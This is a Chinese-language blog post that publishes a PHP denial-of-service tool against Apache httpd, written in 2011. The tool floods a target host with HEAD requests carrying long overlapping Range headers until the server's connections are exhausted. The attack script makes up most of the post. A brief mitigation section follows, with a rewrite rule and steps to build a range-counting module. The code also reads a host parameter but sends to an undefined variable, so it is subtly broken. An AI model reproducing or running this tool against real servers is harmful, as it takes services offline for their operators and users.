---
layout: post
title: "Apache全系曝拒绝服务漏洞-PHP利用工具"
description: "Apache Dos PHP Exhaustion"
category: scripts
tags: ["Apache", "PHP"]
---

通过构造指定长度的range头使得apache无法释放链接，占满MaxClients后便无法再继续提供服务。

<pre>
//Apache httpd Remote Denial of Service (memory exhaustion)
//By Johnlenshaw(www.xiaozhenliang.com)
//Year 2011
$host = $_GET['host'];
set_time_limit(0);
$exec_time = $_GET['time'];
$time = time();
$max_time = $time+$exec_time;
$out = '';

for($i = 0;$i < 1300;$i ++)
{
        $out .= ",5-$i";
}

$out = "HEAD / HTTP/1.1\r\nHost: $ip\r\nRange:bytes=0-".$out;
$out = $out."\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";

while(1){
                if(time() > $max_time)
                {
                        break;
                }

                $fp = fsockopen("tcp://$ip", 80, $errno, $errstr, 5);

                if($fp)
                {
                        fwrite($fp, $out);
                        fclose($fp);
                }
}
echo "Attack Complete.";
</pre>

**临时的应对措施:**

可配置下列rewrite规则：

RewriteEngine on

RewriteCond %{HTTP:Range} bytes=0-.* [NC]

RewriteRule .? http://%{SERVER_NAME}/ [R=302,L]

或执行一下语句：

wget http://people.apache.org/~dirkx/mod_rangecnt.c

/usr/local/apache/bin/apxs -i -a -c mod_rangecnt.c

重启apache即可。以上具体apxs路径需要按照实际环境填写。

此次漏洞对编译过header模块并限定header长度/编译加载mod_security模块的无效。
